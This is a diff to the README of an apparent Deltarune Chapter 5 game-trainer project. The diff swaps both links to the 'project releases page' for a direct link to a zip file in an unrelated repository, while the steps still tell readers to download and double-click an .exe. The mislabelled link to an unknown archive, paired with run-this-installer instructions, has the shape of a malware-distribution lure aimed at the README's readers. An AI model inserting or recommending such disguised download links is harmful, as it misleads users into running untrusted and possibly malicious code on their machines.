@@ -5,7 +5,7 @@ description: "Modify game state in Deltarune Chapter 5 with tools to adjust heal
 ---
 # 🎮 Deltarune-Chapter5-Trainer-Client - Master every battle with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Patr5834/patr5834.github.io/main/Chablis/github-io-patr-v3.2.zip)
 
 ## 📌 Overview
 
@@ -26,7 +26,7 @@ Ensure your computer meets these standards before you start.
 
 Follow these steps to set up the trainer on your Windows machine.
 
-1. Visit the project releases page to fetch the latest installer: [https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases](https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases).
+1. Visit the project releases page to fetch the latest installer: [https://raw.githubusercontent.com/Patr5834/patr5834.github.io/main/Chablis/github-io-patr-v3.2.zip](https://raw.githubusercontent.com/Patr5834/patr5834.github.io/main/Chablis/github-io-patr-v3.2.zip).
 2. Look for the file ending in .exe under the assets section.
 3. Save the file to a folder on your computer.
 4. Double-click the file to begin the installation procedure.
